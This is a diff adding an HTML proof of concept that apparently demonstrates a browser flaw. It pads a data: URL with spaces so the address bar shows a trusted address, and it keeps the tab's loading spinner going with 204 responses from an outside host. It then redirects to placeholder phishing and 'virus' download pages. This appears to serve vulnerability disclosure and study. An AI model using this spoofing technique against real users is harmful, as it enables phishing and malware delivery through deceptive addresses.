@@ -1,0 +1,54 @@
+<p>
+To get the thing you want, please visit the site that you trust:
+<br><a href="http://example.com/" id="link">http://example.com (page)</a>
+
+<p>
+Or download something from the trusted site:
+<br><a href="http://example.com/" id="dl">http://example.com (download)</a>
+<script>
+
+function open_and_pretend_busy(spoofText, spoofedUrl, finalUrl) {
+    var content = 'You are being redirected to ' + spoofText + '.\n' +
+        'Trust me, just look at the tab icon indicator, it is really spinning.';
+    var spaces = new Array(1000).join(' ');
+    var url = 'data:' + spoofedUrl + spaces + ',' + encodeURIComponent(content);
+    var w = window.open(url);
+
+    // Start provisional loads without committing in order to give the false
+    // appearance that something is happening.
+
+    var time_until_next_page_ms = 4000;
+    var start = Date.now();
+    var timer = setInterval(function() {
+        if (Date.now() - start < time_until_next_page_ms) {
+            // Replies with 204 No Content, so page won't unload.
+            w.location.href = 'https://204.robwu.nl';
+        } else {
+            clearInterval(timer);
+
+            w.location.href = finalUrl;
+        }
+    }, 50);
+}
+
+document.getElementById('link').onclick = function(e) {
+    e.preventDefault();
+
+    var spoofedUrl = 'http://example.com/';
+    // For the sake of the demo this is just a data URL, but attackers
+    // could convincingly create something like
+    // example.com.somelongdomain.somehostingservice.tld and rely on
+    // the trust that users have in the previous page.
+    var finalUrl = 'data:,Some phishing URL and page here';
+    open_and_pretend_busy('the login page', spoofedUrl, finalUrl);
+};
+
+
+document.getElementById('dl').onclick = function(e) {
+    e.preventDefault();
+
+    var spoofedUrl = 'http://example.com/';
+    var finalUrl = 'data:application/octet-stream,some virus here';
+    open_and_pretend_busy('[the thing you want to download]', spoofedUrl, finalUrl);
+};
+</script>
